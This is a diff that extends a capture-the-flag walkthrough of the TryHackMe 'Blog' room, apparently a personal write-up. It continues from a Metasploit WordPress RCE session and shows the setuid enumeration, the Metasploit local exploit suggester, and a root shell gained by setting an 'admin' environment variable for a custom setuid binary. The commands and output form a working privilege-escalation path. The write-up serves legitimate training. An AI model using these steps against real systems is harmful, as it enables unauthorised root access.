@@ -358,6 +358,11 @@ Boot up metasploit
 msfconsole
 ```
 
+So that we have a log of all the things we run and find, we can set metasploit to "spool" to a file.
+```
+spool blog-msf.log
+```
+
 We need to search for our exploit.
 ```
 search wordpress
@@ -457,4 +462,147 @@ OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 
 Meterpreter : php/linux
 ```
 
-( TO BE CONTINUED)
+First we can do the basics and try finding the user flag. Normally the user flags are named "user.txt", so we can open a shell and `find` it.
+```
+meterpreter> shell
+Process 1612 created.
+Channel 1 created.
+```
+Now we have a shell open, though it's a basic shell that doesn't have a prompt, and it doesn't have any tab-completion.
+
+Verify this is working:
+```
+whoami
+```
+You should get back "www-data", that is the user the webserver is running as.
+
+Let's search for a user flag.
+```
+find / -type f -name user.txt 2>/dev/null
+/home/bjoel/user.txt
+```
+Note: the `2>/dev/null` is so that "permission denied" errors don't spam our console.
+
+Looks like we found something, let's read it.
+```
+cat /home/bjoel/user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+```
+
+HA HA - Looks like it won't be that easy.
+
+An easy thing to try with metasploit is a suggestion script.
+Exit the shell, then background the meterpreter session. (note the prompt changing to a meterpreter when we exit the shell, and then to msf when we background the meterpreter process)
+```
+exit
+meterpreter> background
+msf (multi/http/wp_crop_rce)>
+```
+
+Search for the exploit suggester module and use it.
+```
+msf (multi/http/wp_crop_rce)> search suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                  normal  No     Multi Recon Local Exploit Suggester
+
+msf (multi/http/wp_crop_rce)> use 0
+msf (post/multi/recon/local_exploit_suggester)>
+```
+Note: I used the number of the exploit in the search results to save having to type out the whole name. Whenever you do a search in metasploit, if something you want was in the results, you can use the number instead of the name.
+
+On checking the options for this we can see that it needs a session id. We have a session in the background right now, so let's list our sessions and attach that session to this suggester module.
+```
+msf (post/multi/recon/local_exploit_suggester)> options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION                           yes       The session to run this module on
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf (post/multi/recon/local_exploit_suggester)> sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information           Connection
+  --  ----  ----                   -----------           ----------
+  1         meterpreter php/linux  www-data (33) @ blog  10.6.8.193:4444 -> 10.10.11.161:40042 (10.10.11.161)
+
+msf (post/multi/recon/local_exploit_suggester)> set session 1
+```
+
+Now we can run it and see if it turns any easy exploits up.
+```
+msf (post/multi/recon/local_exploit_suggester)> run
+```
+
+Well, that didn't find anything. Let's move back into our meterpreter session, create a shell, and search for any binaries with the set uid bit. This is a special permission that lets a program run as a different user, useful since users would not have to be root to make some interactions with things that require root, but the interaction being "curated" by the application. However - applications aren't perfect. If we can find a vulnerable binary, we can pivot off it to get a root shell.
+
+```
+msf (post/multi/recon/local_exploit_suggester)> sessions 1
+meterpreter> shell
+Process 1613 created.
+Channel 2 created.
+find / -type f -perm -u=s 2>/dev/null
+```
+
+You can start searching for these different bins on the GTFOBins site, a place that lists vulnerable binaries and how to exploit them. Not a lot of room to work with here, but it's interesting that there is this /usr/sbin/checker. That's not a normal bin to find, so we should investigate it.
+
+```
+checker
+Not an Admin
+```
+
+Well, looks like it is checking if we are an admin. Of course we aren't one. Let's investigate more.
+We can trace the library calls and system calls with the debugging utilities ltrace and strace (respectively), this lets us run an application and see how it is interacting with everything else.
+Check out [Manual page on ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) and [Manual page on strace](https://man7.org/linux/man-pages/man1/strace.1.html) for more info.
+
+```
+ltrace checker
+```
+
+Looking at the output, we can see a call to getenv. That checks our environment variables, and we can alter those. Let's set the "admin" variable and see what happens now.
+
+```
+export admin=1
+ltrace checker
+getenv("admin")                                  = "1"
+setuid(0)                                        = 0
+system("/bin/bash"
+```
+
+Well it looks like our ourput got inturupted by our being dumped into a root shell, and we can confirm this with whoami.
+```
+whoami
+root
+```
+
+Well, that was easy, usually we get a user flag before getting root access.
+
+Root flags are usually in /root/root.txt, let's see if we get lucky.
+```
+cat /root/root.txt
+--- flag redacted ---
+```
+
+Ding! We have a root flag!
+We still need the user flag, but the only thing our earlier search turned up was a red herring. Though, we did forward all permission denied errors to null, so we only searched through what the www-data user was allowed to see. Let's search again now that we are root.
+
+```
+find / -type f -name user.txt
+```
+
+Aha - it has found a different user.txt that has the real flag! (the location of this file is the answer to one of the challenge room's questions, so I am not putting it here)
+
+The rest of the questions should be straightforward on this one. Definately was a fun room with a somewhat backwards flag capture!
+
+Definately give it a go. [Blog](https://tryhackme.com/room/blog)
